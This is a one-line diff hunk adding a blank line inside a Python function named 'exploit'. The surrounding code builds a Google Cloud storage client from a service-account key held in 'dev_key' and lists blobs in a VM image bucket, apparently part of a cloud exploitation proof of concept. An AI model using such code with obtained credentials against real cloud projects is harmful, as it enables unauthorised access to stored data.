@@ -212,6 +212,7 @@ def exploit(nonce, logging_key):
             break
         except:
             time.sleep(5)
+
     storage_client = storage.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(dev_key)))
     blobs = list(storage_client.list_blobs(f'vm-image-bucket-{nonce}'))
     temp_dir = 'test/' ###TODO change me
